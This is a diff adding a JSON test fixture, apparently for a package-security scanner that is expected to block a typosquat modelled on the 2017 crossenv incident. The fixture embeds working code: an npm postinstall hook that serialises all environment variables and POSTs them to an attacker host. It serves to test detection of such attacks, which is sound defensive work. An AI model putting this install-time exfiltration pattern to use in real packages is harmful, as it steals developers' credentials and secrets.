@@ -1,0 +1,13 @@
+{
+  "name": "crossenv-typosquat-env-exfil",
+  "expect": "block",
+  "expectFinding": "network-exfil-or-loader",
+  "note": "modeled on crossenv (2017): typosquat whose postinstall harvests process.env and POSTs it to an attacker host",
+  "evidence": {
+    "packageName": "crossenv",
+    "sourceFiles": {
+      "package.json": "{\"name\":\"crossenv\",\"version\":\"6.1.1\",\"scripts\":{\"postinstall\":\"node ./package-setup.js\"}}",
+      "package-setup.js": "const http=require('http');const data=JSON.stringify(process.env);const req=http.request({host:'npm.hacktask.net',port:80,method:'POST',path:'/'},()=>{});req.write(data);req.end();"
+    }
+  }
+}
